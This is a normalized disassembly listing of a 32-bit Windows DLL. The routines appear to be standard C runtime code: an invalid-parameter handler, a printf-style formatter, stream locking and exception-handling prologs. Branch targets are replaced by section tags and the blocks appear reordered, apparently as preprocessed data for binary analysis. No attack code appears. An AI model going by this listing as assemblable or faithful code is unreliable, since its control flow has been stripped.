dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1000ab30
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_1000a740
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1000ea01
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008bf6
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_1000ea01
pop ecx
sub_1000ac59
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1000ab30
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1000ac7e
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ac59
int3
pop ebp
jmp eax
sub_1000acbb
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1000ca19
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1000ba8b
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_1000c945
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_1000f0bb
pop ecx
test eax eax
jne r-xdata
call sub_1000ba8b
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1000c945
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000f072
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1000ef88
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1000ae1f
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_1000f111
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_1000ae4e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_1000a3c4
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_1000a3c4
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
mov eax edi
dec ebx
call sub_1000ae1f
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
call sub_1000a3c4
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_1000a3c4
cmp [ eax ] 0x2a
jne r-xdata
call sub_1000a3c4
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
push 0x3f
mov eax edi
call sub_1000ae1f
pop ecx
sub_1000aec7
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_100095af
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
cmp [ ebp - 0x44c ] bl
movzx edx [ esi ]
xor ecx ecx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x420 ] edx
cmp dx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008bf6
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax dx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x420 ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_1000ba6b ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x45c ] eax
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x45c ]
mov edi [ ebp - 0x41c ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push edx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_1000ae1f
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x444 ] ecx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x41c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x41c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x420 ] edx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_10009181
and [ ebp - 0x43c ] 0x0
mov ebx [ ebp - 0x430 ]
sub ebx [ ebp - 0x414 ]
sub ebx [ ebp - 0x428 ]
test [ ebp - 0x408 ] 0xc
mov [ ebp - 0x470 ] ebx
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x424 ]
mov ecx [ ebp - 0x428 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_1000ae4e
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebp - 0x41c ]
mov ecx [ eax ]
add eax 0x8
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0x41c ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x460 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x46c ] ecx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x41c ] edi
call sub_10009c61
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_1000dca3
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1000ae1f
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x434 ] ax
mov [ ebp - 0x428 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0x40c ] ebx
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000f2bb
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x45c ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x410 ]
mov edi [ ebp - 0x424 ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x418 ]
call sub_1000ae4e
pop ecx
cmp [ ebp - 0x414 ] 0x0
jle r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test edi edi
jg r-xdata
push 0x20
mov edx [ ebp - 0x420 ]
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_1000dbc4
mov edx [ ebp - 0x420 ]
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov ebx [ ebp - 0x414 ]
mov eax [ ebp - 0x424 ]
push 0x30
lea esi [ ebp - 0x418 ]
dec edi
call sub_1000ae1f
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
mov [ ebp - 0x40c ] ebx
jmp r-xdata
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x458 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push ebx
push edi
call sub_1000f3f0
add ecx 0x30
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov edi [ ebp - 0x470 ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_1000ae1f
add edi [ ebp - 0x420 ]
pop ecx
test ebx ebx
jg r-xdata
test edi edi
jg r-xdata
call sub_1000a0b0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
dec ebx
call sub_1000f2bb
add esp 0x10
mov [ ebp - 0x420 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1000ae1f
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_1000ba91
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1000dc09
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1000dc09
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1000bb62
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1000cc92
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_1000bba3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1000cc92
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_1000bbd5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1000cbb9
pop ecx
pop ebp
retn
sub_1000bc11
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1000cbb9
pop ecx
pop ebp
retn
sub_1000bc40
push sub_1000bca0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1000bca0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008bf6
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008bf6
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1000bf6b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1000bf22
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10008bf6
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008bf6
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_1000bf52
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1000bf6b
mov eax [ ebp + 0xc ]
push r--data
call sub_1000f730
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10008bf6
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1000bf39
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008bf6
